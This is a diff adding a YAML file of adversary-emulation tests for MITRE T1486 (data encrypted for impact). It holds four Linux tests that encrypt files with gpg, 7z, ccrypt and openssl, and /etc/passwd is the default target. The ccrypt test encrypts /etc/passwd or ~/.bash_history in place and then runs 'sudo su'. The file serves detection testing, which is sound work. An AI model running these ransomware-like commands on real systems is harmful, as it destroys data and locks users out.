@@ -1,0 +1,164 @@
+attack_technique: T1486
+display_name: Data Encrypted for Impact
+
+atomic_tests:
+- name: Encrypt files using gpg (Linux)
+  auto_generated_guid: 7b8ce084-3922-4618-8d22-95f996173765
+  description: |
+    Uses gpg to encrypt a file
+  supported_platforms:
+    - linux
+  input_arguments:
+    pwd_for_encrypted_file:
+      description: the password that you want for the encrypted file
+      type: String
+      default: passwd
+    encrypted_file_path:
+      description: path to the encrypted file
+      type: Path
+      default: /tmp/passwd.gpg
+    input_file_path:
+      description: path to the file that you want to encrypt
+      type: Path
+      default: /etc/passwd
+    encryption_alg:
+      description: encryption algorithm of the file
+      type: String
+      default: AES-256
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Finds where gpg is located
+      prereq_command: |
+        which_gpg=`which gpg`
+      get_prereq_command: |
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
+    cleanup_command: |
+      rm #{encrypted_file_path}
+
+
+- name: Encrypt files using 7z (Linux)
+  auto_generated_guid: 53e6735a-4727-44cc-b35b-237682a151ad
+  description: |
+    Uses 7z to encrypt a file
+  supported_platforms:
+    - linux
+  input_arguments:
+    pwd_for_encrypted_file:
+      description: the password that you want for the encrypted file
+      type: String
+      default: passwd
+    encrypted_file_path:
+      description: path to the encrypted file
+      type: Path
+      default: /tmp/passwd.zip
+    input_file_path:
+      description: path to the file that you want to encrypt
+      type: Path
+      default: /etc/passwd
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Finds where 7z is located
+      prereq_command: |
+        which_7z=`which 7z`
+      get_prereq_command: |
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      $which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}
+    cleanup_command: |
+      $which_7z e #{encrypted_file_path}
+      rm #{encrypted_file_path}
+
+
+- name: Encrypt files using ccrypt (Linux)
+  auto_generated_guid: 08cbf59f-85da-4369-a5f4-049cffd7709f
+  description: |
+      Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.
+  supported_platforms:
+    - linux
+  input_arguments:
+    cped_file_path:
+      description: path where you want your copied file to be
+      type: Path
+      default: /tmp/passwd
+    root_input_file_path:
+      description: path to the file that you want to be encrypted if you are root user
+      type: Path
+      default: /etc/passwd
+    user_input_file_path:
+      description: path to file that you want to be encrypted if you are normal user
+      type: Path
+      default: ~/.bash_history
+    impact_command:
+      description: command to show impact of encryption
+      type: String
+      default: sudo su
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Finds where ccencrypt and ccdecrypt is located and copies input file
+      prereq_command: |
+        which_ccencrypt=`which ccencrypt`
+        which_ccdecrypt=`which ccdecrypt`
+        if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
+      get_prereq_command: |
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi
+    cleanup_command: |
+      if [[ $USER == "root" ]]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi 
+
+
+- name: Encrypt files using openssl (Linux)
+  auto_generated_guid: 142752dc-ca71-443b-9359-cf6f497315f1
+  description: |
+    Uses openssl to encrypt a file
+  supported_platforms:
+    - linux
+  input_arguments:
+    private_key_path:
+      description: path to the private key
+      type: Path
+      default: /tmp/key.pem
+    public_key_path:
+      description: path to the public key
+      type: Path
+      default: /tmp/pub.pem
+    encryption_bit_size:
+      description: size of the bit of encryption
+      type: Integer
+      default: 2048
+    encrypted_file_path:
+      description: path to the encrypted file
+      type: Path
+      default: /tmp/passwd.zip
+    input_file_path:
+      description: path to the file that you want to encrypt
+      type: Path
+      default: /etc/passwd 
+  dependency_executor_name: bash
+  dependencies:
+    - description: |
+        Finds where openssl is located
+      prereq_command: |
+        which_openssl=`which openssl`
+      get_prereq_command: |
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
+      $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
+      $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
+    cleanup_command: |
+      $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
+      rm #{encrypted_file_path}
